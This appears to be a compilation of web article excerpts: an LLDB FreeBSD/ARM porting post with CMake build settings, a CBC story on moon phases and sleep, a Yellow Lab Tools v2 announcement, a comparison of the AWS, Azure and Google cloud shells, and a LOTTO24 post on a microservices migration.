    -DLLVM_TARGETS_TO_BUILD<span>=</span>AArch64

    <span># Use shared libs to speed up linking and avoid huge interim static</span>
    <span># libraries.</span>
    -DBUILD_SHARED_LIBS<span>=</span>ON

    <span># Use our toolchain file.</span>
    -DCMAKE_TOOLCHAIN_FILE<span>=</span><span>"</span><span>${</span>HOME<span>}</span><span>"</span>/toolchain-arm64.cmake
<span>)</span>

cmake <span>"</span><span>${</span>args[@]<span>}</span><span>"</span></code></pre></div>
<p>Once LLVM is configured this way, the regular <code>ninja</code> calls can be used
to build the project.  The build system will automatically configure
a <code>NATIVE</code> subdirectory containing utilities that need to be executed
during the build, while the rest of the project will be built for ARM64.</p>
<h2 id="working-on-additional-architectures">Working on additional architectures</h2>
<h3 id="architecture-specific-code-in-lldb">Architecture-specific code in LLDB</h3>
<p>While a significant part of <code>ptrace(2)</code> API used by debuggers,
and therefore of the debugger itself is architecture-agnostic,
it is practically impossible to debug programs without specific support
for the processor in question.  For example, the debugger benefits
from support for deassembling the code, generating function calls,
inspecting registers, etc.</p>
<p>A large part of the architecture support is generic and shared between
different operating systems.  Moreover, a part of FreeBSD-specific
architecture support is shared between the legacy and new plugins.
Therefore, in order to extend the new plugin to support additional
architectures we mostly needed to introduce the ‘glue’ binding the new
plugin with the architecture support.  However, we also had to implement
support for inspecting and modifying registers (in more modern form
than used by the legacy plugin), choosing opcodes for software
breakpoints and fix existing bugs in platform support.</p>
<p>In the following subsections, we will discuss shortly the architectures
we were working on, and the specifics that we needed to research
in order to proceed.</p>
<h3 id="ptrace2-register-groups">ptrace(2) register groups</h3>
<p>Traditionally, the <code>ptrace(2)</code> API defines three pairs of requests
for getting and setting registers, effectively splitting the registers
visible to userland programs into three groups: General-Purpose
Registers (GPRs), Floating-Point Unit Registers (FPRs) and Debug
Registers (DRs).</p>
<p>General-Purpose Registers are the baseline set of processor’s registers
exposed to userland programs.  This group includes generic registers
that can be used to store arbitrary data by the program (usually
integers or memory addresses) and special CPU registers with predefined
meaning.  Two common examples of special registers are the Program
Counter that is used to help the memory address of the code being
executed currently, and the flag register that is used to expose part
of the CPU state and boolean results of executed instructions.</p>
<p>The non-special registers also often have functions predefined
by the platform’s ABI.  For example, often one of the registers
is dedicated to be the Stack Pointer.  While the program could
technically use it on some CPUs for another purpose, it must preserve the original value
for interoperability.</p>
<p>Floating-Point Unit Registers are the registers used to store
and perform computation on floating-point numbers.  This class
of registers is only present on processors implementing hardware
floating-point support.</p>
<p>Finally, Debug Registers are special CPU registers used to aid
debuggers.  Usually, they are used to enable hardware-assisted
breakpoints and watchpoints.</p>
<h3 id="arm-and-aarch64">ARM (and AArch64)</h3>
<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/rpi0.jpg" alt="Raspberry Pi Zero"></p>
<p>ARM is a family CPU architectures maintained by <a href="https://www.arm.com/">ARM Ltd.</a>, primarily used on embedded platforms.
The processors up to ARMv7 were pure 32-bit.  ARMv8 featured an optional
(though present in the vast majority of ARMv8 processors) 64-bit
architecture, often called AArch64 or ARM64.</p>
<p>All 32-bit ARM processors feature 15 general purpose …</p></div></div>

Exactly why this is happening is unknown.</p>  <p>"We were kind of shocked," said Casiraghi, a postdoctoral researcher in biology at the University of Washington.&nbsp;</p>  <p>He is the lead author of a study published this week <a href="http://advances.sciencemag.org/content/7/5/eabe0465">in the journal <em>Science Advances</em></a>, which tracked&nbsp;three Indigenous communities in Argentina, and compared them to&nbsp;students at the University of Washington. The work was led by University of Washington biology professor Horacio de la Iglesia and involved a&nbsp;team of researchers from Yale University and National University of Quilmes in Argentina.</p>  <p>The team fitted participants with wrist monitors akin to sophisticated smart watches, which collected biological sleep data for between one and two lunar cycles&nbsp;(one lunar cycle lasts about 29.5 days.)</p>  <p>A majority of the participants in the study were found to go to bed later and sleep less in the week ahead of a full moon.</p>  <p>"It might be that the biological clock is being delayed in a way that now it's telling you to go to sleep at a later time, but it might also be that for some reason this accumulation of waking time is not as important during certain days of the moon cycles," said&nbsp;Casiraghi.</p>  <h2>Sleep in the real world</h2>  <p>Casiraghi's research supervisor de la Iglesia<strong>&nbsp;</strong>had previously studied how lunar phases are correlated with increased activity in animals, such as crabs and monkeys in Argentina.</p>    <p>That was a springboard to asking: What about humans?</p>  <p>While previous sleep clinic research had&nbsp;investigated connections between lunar cycles and sleep, Casiraghi said&nbsp;those studies were limited by the fact that participants were in an unrealistic, lab-like setting, and results couldn't be easily replicated.</p>  <p>Casiraghi noted past research has established that with greater access to electric light, people tend to go to sleep later into the evening and have shorter nights than those with limited access.</p>  <p>He set out to study this in the real world, tracking the sleep patterns&nbsp;of about 100 participants spread across three Indigenous Toba/Qom communities in Formosa, Argentina.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5893489.1611952560!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/leandro-casiraghi-sleep-study-researcher-and-toba-field-assistant.jpg 300w,https://i.cbc.ca/1.5893489.1611952560!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/leandro-casiraghi-sleep-study-researcher-and-toba-field-assistant.jpg 460w,https://i.cbc.ca/1.5893489.1611952560!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/leandro-casiraghi-sleep-study-researcher-and-toba-field-assistant.jpg 620w,https://i.cbc.ca/1.5893489.1611952560!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/leandro-casiraghi-sleep-study-researcher-and-toba-field-assistant.jpg 780w,https://i.cbc.ca/1.5893489.1611952560!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/leandro-casiraghi-sleep-study-researcher-and-toba-field-assistant.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5893489.1611952560!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/leandro-casiraghi-sleep-study-researcher-and-toba-field-assistant.jpg"></p></div><figcaption>Leandro Casiraghi, right, and Adán García, one of the Toba field assistants involved in the study.<!-- --> <!-- -->(Germán Joosten)</figcaption></figure></span></p>  <p>One community was urban and had ready access to artificial light; another was rural but had limited access to artificial light; and the third, also rural, had no access to artificial light.</p>  <p>Casiraghi said going into the study, the team assumed if they found any sleep effect linked to lunar phases, the signal would be strongest on the night of a full or new moon, when the moon glow was at its brightest in the middle of the night. The argument would be that the light helped our&nbsp;ancestors see more clearly and stay active later.</p>  <h2>Assumptions eclipsed</h2>  <p>That's also why the team assumed they might find an effect in the groups with no or little access to electric light, because those groups might stand to benefit more from moonlit nights than those with ample access to light in the home.</p>  <p>But two unexpected patterns emerged.</p>  <p>The team found most people across the three groups went to bed later and slept less than usual — not on a full or new moon&nbsp;—&nbsp;but in the three to five days before. The amount of sleep on average varied between 46 and 58 minutes over the course of the lunar cycle. Bedtimes varied by around half an hour.</p>  <p>And sleep cycles of the urban and two rural communities displayed similar rhythm changes in the few days before the full moon, regardless of access to light.</p>  <p><span><span><iframe src="https://www.youtube.com/embed/Q17i1srjOqY" frameborder="no" title="YouTube content" allowfullscreen=""></iframe></span></span></p>  <p>The urbanites with access to light around the clock went to bed later and slept less on average than either rural community during those days. The rural community with some access to light went to sleep earlier than the urbanites, but later than the light-free rural community, which also slept more than all three.&nbsp;</p>  <p>But the main effect was the same. Access to electric light didn't shield groups from the stimulating effects of the moon.</p>  <p>"We went through the data like 10 times to convince us what we were seeing was actually true," said Casiraghi.</p>      <p>The team compared their findings to sleep data gleaned from nearly 500 University of Washington undergraduates&nbsp;in past studies.&nbsp;</p>  <p>The same "striking" correlation between moon phases and sleep patterns was apparent in the undergrads living in post-industrial Seattle as in the Toba/Qom.</p>  <h2>Light not the only driver</h2>  <p>Casiraghi has a theory as to why it would've benefited early humans to stay up later during this time.</p>  <p>In the days before a full moon, the sun sets and a luminous moon takes its place in the sky earlier in the evening than usual.&nbsp;</p>  <p>Casiraghi suggested it could've been adaptive for hunter-gatherer groups to take advantage of the fact that the moonlight "stretched the day," allowing longer periods of activity.&nbsp;Full moons in the middle of the night provided less useful benefit.&nbsp;</p>  <p>This squares with the cultural stories of the Toba/Qom. They said brighter nights around the full moon were traditionally used to safely hunt and fish later into the evening. It was also a time for greater social activity, they say — including romantic trysts between young people.</p>  <p>But Casiraghi admitted this doesn't fully explain what's going on.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5857031.1611939027!/fileImage/httpImage/image.jpeg_gen/derivatives/original_300/last-full-moon.jpeg 300w,https://i.cbc.ca/1.5857031.1611939027!/fileImage/httpImage/image.jpeg_gen/derivatives/original_460/last-full-moon.jpeg 460w,https://i.cbc.ca/1.5857031.1611939027!/fileImage/httpImage/image.jpeg_gen/derivatives/original_620/last-full-moon.jpeg 620w,https://i.cbc.ca/1.5857031.1611939027!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/last-full-moon.jpeg 780w,https://i.cbc.ca/1.5857031.1611939027!/fileImage/httpImage/image.jpeg_gen/derivatives/original_1180/last-full-moon.jpeg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5857031.1611939027!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/last-full-moon.jpeg"></p></div><figcaption>A full moon rises over Calgary as if wedged between city skyscrapers.<!-- --> <!-- -->(Submitted by Francois Bernier)</figcaption></figure></span></p>  <p>If people living in a big city setting surrounded by television screens, household light sources and light pollution are staying up later ahead of a full moon, the light itself can't be the only driver.</p>  <p>The answer may be hiding in our biology.&nbsp;</p>    <p>On any given night, we tuck in for two reasons: our biological clock tells us to, and we've been awake so long we've reached an energetic limit for the day.</p>  <p>Which of those two is being influenced by the moon —&nbsp;and how the moon is exerting that influence —&nbsp;remains a mystery, said Casiraghi.</p>  <p>"These are the questions we're trying to engage with in the near future."&nbsp;</p>  <hr>  <p><em>Written and produced by <a href="https://twitter.com/brycehoye">Bryce Hoye.</a></em></p></span></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Here it is, the first major revamp in Yellow Lab Tools’ history! After a lot of hard work, I’m happy to introduce v2. It comes with a brand-new engine, a handful of new audits and even a visual redesign.</p>
<p><strong>TL;DR – access the updated tool here</strong>: <a rel="noreferrer noopener" href="https://yellowlab.tools/" target="_blank">https://yellowlab.tools</a></p>
<h2>What is Yellow Lab Tools?</h2>
<p>Yellow Lab Tools is a free and <a rel="noreferrer noopener" href="https://github.com/YellowLabTools/YellowLabTools" target="_blank">open-source</a> testing tool designed to help speeding up web pages. It checks dozens of potential problems, calculates a global score and provides with in-depth details to fix identified issues. I created it in 2014 and I’ve made it evolve ever since to follow the latest Webperf best practices, but today’s v2 release is the most important update ever.</p>
<figure><img src="https://letstalkaboutwebperf.com/wp-content/uploads/2021/02/screencapture-yellowlab-tools-result-604x1024.png" alt="Yellow Lab Tools v2 screenshot" data-old-src="data:image/svg+xml;utf8,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20width%3D%27768%27%20height%3D%271302%27%3E%3Crect%20width%3D%27100%25%27%20height%3D%27100%25%27%20fill%3D%27%23333%27%2F%3E%3C%2Fsvg%3E" data-src="https://letstalkaboutwebperf.com/wp-content/uploads/2021/02/screencapture-yellowlab-tools-result-604x1024.png" data-srcset="https://letstalkaboutwebperf.com/wp-content/uploads/2021/02/screencapture-yellowlab-tools-result-604x1024.png 604w, https://letstalkaboutwebperf.com/wp-content/uploads/2021/02/screencapture-yellowlab-tools-result-177x300.png 177w, https://letstalkaboutwebperf.com/wp-content/uploads/2021/02/screencapture-yellowlab-tools-result-768x1302.png 768w, https://letstalkaboutwebperf.com/wp-content/uploads/2021/02/screencapture-yellowlab-tools-result.png 1600w"></figure>
<p>Yellow Lab Tools could be seen as a competitor of Google PageSpeed Insights. I rather see them as complementary tools, as they don’t audit the same issues.</p>
<h2>What’s new in Yellow Lab Tools v2?</h2>
<p>Yellow Lab Tools keeps a lot of useful insights from v1. For example, it still audits image compression, lazyloading, file minification, CSS complexity, overweighted webfonts, expires headers… But it is now a bit more capable.</p>
<h3>A new engine based on Chrome Headless</h3>
<p>Yellow Lab Tools mainly relies on a lower level tool called <a rel="noreferrer noopener" href="https://github.com/macbre/phantomas" target="_blank">Phantomas</a> (by Maciej Brencz) that loads a page in a headless browser and calculates a bunch of metrics. Until recently, it was using PhantomJS, which was stuck on an old version of WebKit (equivalent to Chrome 40).</p>
<p>Maciej Brencz did a huge work recently to switch his tool to <a rel="noreferrer noopener" href="https://github.com/puppeteer/puppeteer" target="_blank">Puppeteer</a>. Therefore, Yellow Lab Tools now uses one of the latest version of Chrome’s engine. This is the most important change in Yellow Lab Tools v2, which finally supports Brotli, WebP, WOFF 2, HTTP/2, responsive images, high DPI screens and much more.</p>
<h3>Best practices updated for HTTP/2</h3>
<p>The way HTTP/2 works reduces the overhead caused by the number of requests. Yellow Lab Tools used to urge you to concatenate files and create image sprites of font icons, this is not the case anymore.</p>
<p>Also, I revamped the HTTP/2 audit. It is more reliable and now tests every domain, 3rd parties included, instead of just the main domain.</p>
<h3>Old TLS protocols detection</h3>
<p>TLS is the protocol in charge of securing HTTPS connections. Compared to 1.2, the latest version 1.3 of the TLS protocol improves the initial connection speed. Compared to 1.0 or 1.1, it improves security. Yellow Lab Tools now alerts you if any domain uses an old version.</p>
<h3>Brotli compression</h3>
<p>Yellow Lab Tools used to point a finger at textual requests not using gzip compression and tell how many kilobytes would be saved. V2 now recommends Brotli for not-compressed files, but it also compares gzip vs. Brotli. You’ll be surprised by the potential gain.</p>
<h3>WOFF 2 detection</h3>
<p>Similarly, Yellow Lab Tools now tries to transform TTF or WOFF fonts into WOFF 2 files and tells you the gain. This format actually achieves better compression by using Brotli.</p>
<h3>JavaScript complexity</h3>
<p>More and more JavaScript executes on websites nowadays and this is becoming a real issue. Puppeteer gives access to Chrome’s JavaScript profiling capabilities and this is something I plan to explore in the near future. The hardest part is to figure out good practices out of raw JavaScript execution traces. Any idea is very welcome.</p>
<p>So for the moment, I only added a generic yet meaningful metric: “Total JS execution time”.</p>
<h3>Better device emulation</h3>
<p>Yellow Lab Tools v1 was able to simulate mobile, tablet and desktop devices, but with a 1×1 pixel density only. The v2 increases density for small devices and adds a new HD desktop. Here is the new list:</p>
<ul><li>Phone: 360×640 with 3x pixel density</li><li>Tablet: 800×1200 with 2x pixel density</li><li>Desktop: 1280×800</li><li>HD desktop: 1536×960 with 2x pixel density</li></ul>
<p>Also, unless you change it before launching a test, the default tested device is now mobile.</p>
<h3>A new design!</h3>
<p>I wanted users to instantly notice a change in Yellow Lab Tools. So I’ve replaced the splashy purple background and made some smaller adjustments. The result looks a bit more serious, but you won’t get lost, as every element stays in place.</p>
<figure><img src="https://letstalkaboutwebperf.com/wp-content/uploads/2021/02/YLT-v2-screenshot-home-2-1024x631.png" alt="Yellow Lab Tools v2 home page" data-old-src="data:image/svg+xml;utf8,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20width%3D%271024%27%20height%3D%27631%27%3E%3Crect%20width%3D%27100%25%27%20height%3D%27100%25%27%20fill%3D%27%23333%27%2F%3E%3C%2Fsvg%3E" data-src="https://letstalkaboutwebperf.com/wp-content/uploads/2021/02/YLT-v2-screenshot-home-2-1024x631.png" data-srcset="https://letstalkaboutwebperf.com/wp-content/uploads/2021/02/YLT-v2-screenshot-home-2-1024x631.png 1024w, https://letstalkaboutwebperf.com/wp-content/uploads/2021/02/YLT-v2-screenshot-home-2-300x185.png 300w, https://letstalkaboutwebperf.com/wp-content/uploads/2021/02/YLT-v2-screenshot-home-2-768x473.png 768w, https://letstalkaboutwebperf.com/wp-content/uploads/2021/02/YLT-v2-screenshot-home-2.png 1574w"></figure>
<h3>Many other smaller improvements</h3>
<ul><li>Scores are adjusted to reflect nowadays browsers and network connections. </li><li>Minification of inline JS and CSS is now analyzed.</li><li>Responsive images are now correctly taken into account.</li><li>The infamous 255 and 256 errors won’t happen anymore. Goodbye!</li><li>Preloaded resources are not counted twice anymore.</li><li>Declared but unused webfonts are not counted anymore.</li><li>Native image lazyloading is taken into account.</li><li>Videos are better recognized.</li><li>A progress bar is now displayed during the audit and the favicon turns green when the test ends.</li></ul>
<h3>Some removed audits</h3>
<p>Here is a list of audits that I disabled in V2, for various reasons:</p>
<ul><li>Concatenate small files (because of HTTP/2, as seen earlier)</li><li>DOM queries without results</li><li>Duplicated DOM queries</li><li>DOM access on scroll</li><li>jQuery calls on empty objects</li><li>jQuery events not delegated</li><li>Console messages</li><li>Unused Unicode ranges in fonts (because of a technical issue, but I want it back soon)</li></ul>
<p>Also, Yellow Lab Tools used to show a JS timeline. I’ve removed it in v2, too complex and rarely useful.</p>
<h2>Buy me a coffee</h2>
<p>If you like my work and my tool, I would be really thankful and highly motivated if you considered offering me a coffee:</p>
<p><a href="https://ko-fi.com/Q5Q636AJG" target="_blank"><img height="36" src="https://cdn.ko-fi.com/cdn/kofi3.png?v=2" alt="Buy Me a Coffee at ko-fi.com"></a></p>
<p>The more coffee I drink = The less sleep I need = The more time I spend improving Yellow Lab Tools!</p>
<h2>Sponsoring</h2>
<p>I am also looking for sponsors. If you work for a company in the performance industry, let’s talk. You can financially help me to improve the tool. In return I can offer you:</p>
<ul><li>visibility amongst highly qualified visitors,</li><li>advertising spaces on home page / waiting page / results page / about page,</li><li>some good web performance SEO juice,</li><li>my eternal gratitude.</li></ul>
<p>I take this opportunity to thank <a rel="noreferrer noopener" href="https://www.fasterize.com/en/" target="_blank">Fasterize</a>, a sponsor that generously hosts Yellow Lab Tools since 2018.</p>
<h2>Cool story, but where is Yellow Lab Tools?</h2>
<p>It is just there: <a rel="noreferrer noopener" href="https://yellowlab.tools/" target="_blank">https://yellowlab.tools</a>.</p>
<p>Enjoy!</p>

<p>I keep getting more and more powerful laptops, and then offloading more and more processing to the cloud. SOMETHING’S GOTTA GIVE! My local machine doesn’t just run web browsers and chat apps. No, my laptop is still loaded up with dev tools, while all my virtual machines and container clusters now live in the cloud. That helps. But we’re seeing  more and more of the dev tools sneak into the cloud, too.</p>



<p>One of those dev tools is the shell experience. If you’re like me—actually, you’re probably much more advanced than me—you invest in a loaded terminal on your machine. On my Mac, I directly install a few tools (e.g. git, gcloud CLI) but use Homebrew to keep most of my favorite tools close by. </p>

<p>It’s no small effort to maintain a local terminal environment that’s up to date, and authenticated to various endpoints. To make all this easier, each of three hyperscalers now has a “cloud shell” experience that offers developers a hosted, pre-loaded terminal for working with that cloud.</p>



<p><strong>In this blog post, I’m going to look at the cloud shells from AWS, Microsoft Azure, and Google Cloud, and see what they really have to offer.</strong> Specifically, I’m going to assess:</p>



<ul><li><strong>Shell access.</strong> How exactly do you reach and use the shell?</li><li><strong>Shells offered</strong>. Bash? Powershell?</li><li><strong>Amount of storage provided</strong>. How much can you stash in your environment?</li><li><strong>Durability period</strong>. How long does each cloud hold onto your compute environment? Storage?</li><li><strong>Platform integrations</strong>. What ways does the shell integrate with the cloud experience?</li><li><strong>Embedded tools</strong>. What comes pre-loaded in the shell?</li><li><strong>Code editing options</strong>. Is there a way to edit files or build apps?</li><li><strong>Compute environment configuration/extensibility</strong>. Can you change the shell environment temporarily or permanently?</li><li><strong>UX and usability controls</strong>. What can you do to tweak the appearance or behavior?</li></ul>



<p>Let’s take a look.</p>



<p><em>Disclaimer: I work for Google Cloud, so obviously I’ll have some biases. That said, I’ve used AWS for over a decade, was an Azure MVP for years, and can be mostly fair when comparing products and services. Please call out any mistakes I make!</em></p>







<p>GCP offers a Cloud Shell that <a href="https://cloud.google.com/shell/docs/how-cloud-shell-works">runs within a Docker container on a dedicated Google Compute Engine virtual machine</a>. Not that you see any of that. You just see a blinking cursor.</p>



<p>How do you reach that cursor? From within the GCP Console, there’s an ever-present button in the top navigation. Of note, you can also access it via a dedicated link at <a href="https://shell.cloud.google.com/">shell.cloud.google.com</a>.</p>

<p>Once you launch the Cloud Shell—and if it’s the first time, you’ll see a brief message about provisioning your infrastructure—you see a new frame on your screen. Note that this is a globally distributed service, and <a href="https://cloud.google.com/shell/docs/how-cloud-shell-works#zone_selection">you’re automatically assigned to the closest geographic region</a>. </p>

<p>Each user gets <strong>5GB of persistent storage</strong> that’s mounted into this underlying virtual machine. This <strong>VM terminates after 20 minutes</strong> of inactivity. If you don’t use Cloud Shell at all for 120 days, the home disk goes away too. </p>



<p>You have <strong>two default shell interpreters</strong> (Bash and sh) at your disposal here. Google Cloud Shell lets you create unique sessions via tabs, and see below that I’m using one tab to list all the shells. I was able to switch between shells, including PowerShell too!</p>

<p>Cloud Shell comes with lots of <a href="https://cloud.google.com/shell/docs/how-cloud-shell-works#tools"><strong>pre-loaded tools</strong></a> including gcloud, vim, emacs, gradle, helm, maven, npm, pip, git, docker, MySQL client, TensorFlow, and Terraform. It also has built-in <a href="https://cloud.google.com/shell/docs/how-cloud-shell-works#language_support">language support</a> for Java, Go, Python, Node.js, Ruby, PHP, and .NET Core.</p>



<p>If you want tools that aren’t pre-loaded by Google Cloud, you’ve got a few options. You can manually install tools during your session, or, <a href="https://cloud.google.com/shell/docs/configuring-cloud-shell#environment_customization">create a customer_environment script</a> that runs whenever your instance boots up.</p>



<p>What about <strong>platform integrations</strong>? If you call a Google Cloud API that requires credentials, there’s a <a href="https://cloud.google.com/shell/docs/auth">prompt for authorization</a>. There’s also an “<a href="https://cloud.google.com/shell/docs/open-in-cloud-shell">Open in Cloud Shell</a>” feature that makes it simple to create links that trigger opinionated Cloud Shell instances. If you’re writing tutorials or want people to try the code in your git repo, you can generate a link. There’s also a baked-in <a href="https://cloud.google.com/shell/docs/using-cloudshell-command">cloudshell CLI</a> to launch tutorials, download files, and more. You can also use the gcloud CLI on your local workstation to tunnel into the Cloud Shell, thanks to the <a href="https://cloud.google.com/sdk/gcloud/reference/beta/cloud-shell">gcloud beta cloud-shell</a> operation.</p>



<p>The Google Cloud Shell also has a full-fledged <strong>code editor built in</strong>. This editor—also available directly via <a href="https://ide.cloud.google.com/">ide.cloud.google.com</a>—gets launched right from the Cloud Shell, either through the button on the Cloud Shell navigation or by invoking the <code>cloudshell edit .</code> command.</p>

<p>This editor is based on Eclipse Theia and has the Cloud Code extensions built in. This means I can create apps, use source control, link to GCP services, run tests, and more. Because Cloud Shell <a href="https://cloud.google.com/shell/docs/using-web-preview">supports Web Preview</a>, you can also start up web applications and hit a local endpoint.</p>



<p>Let’s look at the overall <strong>user experience</strong>. In the Cloud Shell navigation menu, I have options to send key combinations (e.g. Ctrl+V), change the look and feel (e.g. color, font), upload or download files, run in safe mode, restart the Cloud Shell instance, minimize the frame itself, break it out into its own window, or close the terminal entirely.</p>

<p>With this mix of free storage, a wide set of tools, a fully functional code editor, and easily extendible environments, the Google Cloud Shell feels like a very complete experience.</p>







<p>Azure provides a <a href="https://azure.microsoft.com/en-us/features/cloud-shell/">Cloud Shell</a> that runs on a temporary virtual machine. Like with GCP, all the infrastructure details are invisible, and users just get a virtual terminal.</p>



<p>You have a few ways to reach Azure’s Cloud Shell. There’s an always-there button in the Portal and a direct link available at <a href="https://shell.azure.com/">shell.azure.com</a>.</p>

<p>The compute instance is available at no charge. These instances use a <strong>5GB persistent storage</strong> image in your file share, and it appears that you pay for that. Like the Google Cloud Shell, the Azure one uses non-durable compute nodes that time out after <strong>20 minutes of inactivity</strong>.</p>



<p>You have <strong>two shell experiences</strong>: bash or PowerShell. Storage is shared between each.</p>

<p>The Azure Cloud Shell comes <a href="https://docs.microsoft.com/en-us/azure/cloud-shell/features#tools">absolutely loaded with <strong>tools</strong></a>. You have all the standard Azure tools (Azure CLI, azcopy, etc) along with things like vim, emacs, git, maven, npm, Docker, kubectl, Helm, MySQL client, PostgreSQL client, Cloud Foundry CLI, Terraform, Ansible, Packer, and more. There’s also built-in language support for Go, Ruby. .NET Core, Java, Node.js, PowerShell, and Python. I didn’t see any obvious way to customize the experience that lasts beyond a given session.</p>



<p>As far as <strong>integrations</strong>, it appears there is SSO with Azure Active Directory. There’s also a special PowerShell commandlet for managing Exchange Online. Try to control yourselves. Similar to GCP, the Azure Cloud Shell supports a URL format that lets tutorial creators launch the Cloud Shell from anywhere. Visual Studio Code users can also <a href="https://microsoft.github.io/AzureTipsAndTricks/blog/tip49.html">integrate the Azure Cloud Shell into their local dev experience</a>.</p>



<p>Azure also provides a handy <strong>code editor</strong> within their Cloud Shell experience. Based on the open source Monaco editor, has a basic file explorer, command palette, and language highlighting.</p>

<p>Let’s look at the <strong>user experience</strong>. In the Cloud Shell navigation bar, you have buttons to restart the shell, configure font style and size, download files, upload files, open the code editor, trigger a local web server, minimize the frame, or shut it down. </p>



<p>All in all, it’s a solid experience. Not as rich as what GCP has, but entirely functional with nice touches like the code editor, and easy switching between bash and PowerShell.</p>







<p>AWS is the newest entrant to the cloud-based terminal with their <a href="https://aws.amazon.com/cloudshell/">AWS CloudShell</a>. AWS seems careful to call the host a “<a href="https://docs.aws.amazon.com/cloudshell/latest/userguide/vm-specs.html#vm-configuration">computing environment</a>” versus ever saying “virtual machine.” It’s possible that you get a container in a shared environment.</p>



<p>It looks like you have one way to reach the CloudShell. There’s a button in the AWS Console navigation bar. </p>

<p>There’s no cost for AWS CloudShell and you get <strong>1GB of persistent storage</strong> (also for free). The service is available in a handful of AWS regions (3 in the US, 1 in Ireland, 1 in Tokyo). Sessions expire after 20-30 minutes, and <strong>data is held for 120 days</strong>.</p>



<p>AWS CloudShell has <a href="https://docs.aws.amazon.com/cloudshell/latest/userguide/working-with-cloudshell.html#using-shells"><strong>three shell experiences</strong></a> including bash, PowerShell, and z shell. </p>

<p>The AWS CloudShell comes with a handful of useful <strong>pre-loaded tools</strong>. You get the AWS tools (e.g. AWS CLI, AWS SAM), as well as git, make, ssh, and vim. You can modify the default environment by creating a .bashrc script that runs whenever the bash shell fires up. There’s native language support for Node.js and Python. </p>



<p>There’s one <strong>platform integration</strong> I noticed, which helps you <a href="https://docs.aws.amazon.com/cloudshell/latest/userguide/tutorial-code-commit.html">push and pull code</a> from AWS CodeCommit. </p>



<p>There are some nice touches in the AWS CloudShell <strong>user experience</strong>. I like that you can stack tabs (session) or put them side by side. You can also download and upload files. AWS also offers settings to change the font size or switch from dark mode to light mode.</p>

<p>AWS offers a functional experience that’s basic, but useful for those living in an AWS world.</p>



<p>It’s great to see all the major clouds offering this functionality. GCP objectively has the most feature-rich experience, but each one is useful. Try them out, and see if they can make your dev environment simpler.</p>

												            <p>Microservices promise superior scalability, development speed improvements, fault tolerance and reliability. Migrating from a traditional application landscape to microservices is a challenging task though.</p>
<p>LOTTO24 took on the challenge and succeeded due to its collaborative approach and team spirit. We want to share three of the most accelerating turns we took when refactoring our monolith to microservices.</p>

                                    <p>One of the first tasks when migrating to microservices is to split up your monolithic platform into small, logical connected chunks so that teams can work independently from one another.</p>
<p>Therefore, the first misconception is that a monolithic application needs to be “prepared” for a microservice by refactoring. This belief has been shared by consultants, partners, experts, and several blogs as learning when discussing migration issues.</p>
<p>At LOTTO24, we start such initiatives collaboratively. Once team members identify how to proceed towards a common goal, we discuss this at our weekly Competence Center Architecture (CCA) meeting, which is open for everybody to participate, propose and challenge new ideas and initiatives.</p>
<p>The proposal is simple. Microservices are “just” extracted code from a monolithic application. In the best case, the code is being extracted so that every team can build and release its features independently from another, without too much coordination. Great contract and API testing should secure the few boundaries that exist.</p>
<p>Indeed it can be quite useful. However, it should not be the priority!</p>

        <p>It turns out that the task is not as easy as it sounds. Let’s have a look at a typical monolithic platform:</p>
<p>As the illustration shows, the platform consists of four layers that all developers of the company contribute to:</p>
<p>– Frontend layer (Consists of shared CSS, shared JS, etc…)<br>
– API layer (Consists of shared Security Configuration etc…)<br>
– Platform layer (Consists of Database connection pools and all major features and processes)<br>
– Database layer (Consists of all platform and data tables cross-linking each other)</p>
<p>Each of these layers will be individually altered and updated daily when teams serve new features and functionalities.</p>
<p>Typically monoliths employ dependencies across domains and team boundaries.<br>
Imagine a payment service that should&nbsp;only accept new credit cards if a customer account is not blocked.</p>
<p>Services to manage account restrictions might be maintained by a customer team, while a payment team operates payment providers.</p>
<p>The payment team wants to enhance the security by verifying if a customer is not being blocked before accepting new credit cards as a payment method.</p>
<p>In a monolithic environment, the payment team would search for blocked states in the codebase and access code written by the customer team without further notice.</p>
<p>This way, over time, monoliths typically create a big network of cross-team dependencies that are hard to decouple and hard to manage.</p>

                                    <p>As usual, a team suggested this approach and started an initiative supported by all engineering teams.</p>
<p>The initiative’s task was to extract and clean up the code to prepare the various modules for microservice extraction. How could that be done? The code was analyzed, and the initiative decided to start with our dear beloved customer object.</p>
<hr>
<p><em>The customer object is a Database Entity Class in our monolith application that is used to reference customer data and settings. It was the most shared object in our platform code. It contains information about a customer such as an account status such as being blocked, the account’s e-mail address, a customer number, and links to customer preferences such as payment methods and limits.</em></p>
<hr>
<p>Starting with the customer object was based on the assumption that this will be the hardest part to refactor. Since almost all our platform monolith code references the customer object, all the references will be cleaned up and replaced by references to a customer identifier once it is extracted. This will allow all the other teams to convert their functionalities and migrate them into microservices.</p>

                      </div>

      </p>
      <div data-aos="fade-left">
                
        <p>One of the problems with this approach is that teams tend to continue to extend and alter existing code unless the customer object is extracted.</p>
<p>The approach, in general, is a great idea. However, to push through the initial refactoring takes quite a lot of time. And this is an issue.<br>
Since only once the customer object is extracted, teams really had a chance and committed to building functionalities into microservices. Other teams tended to continue adding features into the monolithic layers due to priorities.</p>
<p>Every team that had a demand to add a new feature also had to add new dependencies to the customer object growing the work that the initiative had to do faster than the team cleaning up those references could hold up.<br>
